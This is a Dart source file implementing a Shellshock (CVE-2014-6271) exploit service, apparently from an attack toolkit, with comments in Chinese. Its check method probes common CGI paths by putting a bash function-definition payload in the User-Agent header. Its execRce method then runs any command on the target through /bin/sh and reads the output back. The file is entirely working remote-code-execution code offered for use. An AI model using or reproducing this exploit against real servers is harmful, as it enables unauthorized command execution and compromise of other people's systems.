import 'exp_result.dart';
import '../../../core/http/http_client.dart';

class ShellshockExpService {
  final String baseUrl;
  final String cgiPath;
  final Duration timeout;

  /// 检测成功后记录的实际可用路径，供 execRce 使用
  String? discoveredPath;

  ShellshockExpService({
    required this.baseUrl,
    this.cgiPath = '/victim.cgi',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  late final MatrixHttpClient _httpClient = MatrixHttpClient(
    baseUrl: baseUrl,
    timeout: timeout,
    allowBadCertificate: false,
  );

  // 必须包含 Content-Type 头，否则 Apache mod_cgi 返回 500 错误页
  static const _checkPayload =
      '() { :; }; echo Content-Type: text/plain; echo; echo SHELLSHOCK_54289';

  static const _candidatePaths = [
    '/victim.cgi',
    '/cgi-bin/victim.cgi',
    '/cgi-bin/test.cgi',
    '/cgi-bin/vulnerable',
  ];

  Future<ExpResult> check({void Function(String)? onLog}) async {
    final paths = [
      cgiPath,
      ..._candidatePaths.where((p) => p != cgiPath),
    ];

    for (final path in paths) {
      final url = '$_base$path';
      onLog?.call('[*] 探测 $url');
      try {
        final res = await _httpClient.get(
          url,
          headers: {'User-Agent': _checkPayload},
        );
        final body = res.body ?? '';
        final previewLen = body.length.clamp(0, 80);
        onLog?.call(
          '[i] HTTP ${res.statusCode}  body(${body.length}B): '
          '${body.substring(0, previewLen).replaceAll('\n', ' ')}',
        );
        if (body.contains('SHELLSHOCK_54289')) {
          discoveredPath = path;
          return ExpResult(
            true,
            'CVE-2014-6271 (Shellshock)',
            'Shellshock 存在，注入路径: $path',
          );
        }
      } catch (e) {
        onLog?.call('[!] $path 请求失败: $e');
      }
    }
    return const ExpResult(false, 'CVE-2014-6271 (Shellshock)', '');
  }

  static const _rceS = 'MATRIX_RCE_S';
  static const _rceE = 'MATRIX_RCE_E';

  Future<String?> execRce(String cmd, {void Function(String)? onLog}) async {
    final path = discoveredPath ?? cgiPath;
    final escapedCmd = cmd.replaceAll("'", r"'\''");
    final payload = '() { :; }; echo Content-Type: text/plain; echo; '
        "{ echo 'echo $_rceS'; echo '$escapedCmd'; echo 'echo $_rceE'; } > /tmp/_ss_\$\$; "
        'unset HTTP_USER_AGENT; exec /bin/sh /tmp/_ss_\$\$';
    final url = '$_base$path';
    try {
      final res = await _httpClient.get(
        url,
        headers: {'User-Agent': payload},
      );
      final body = res.body ?? '';
      final s = body.indexOf(_rceS);
      final e = body.indexOf(_rceE);
      if (s == -1 || e == -1) return null;
      final out = body.substring(s + _rceS.length, e).trim();
      return out.isEmpty ? '(命令已执行，无输出)' : out;
    } catch (e) {
      onLog?.call('[!] execRce 异常: $e');
      return null;
    }
  }
}
